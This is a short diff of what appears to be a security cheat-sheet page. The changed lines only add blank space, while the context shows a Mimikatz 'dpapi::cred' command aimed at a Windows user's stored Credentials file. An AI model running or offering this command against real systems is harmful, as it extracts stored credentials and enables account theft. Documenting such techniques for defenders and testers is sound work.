@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:18.798330+00:00'
 ```bash
 $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
 ```
+
+
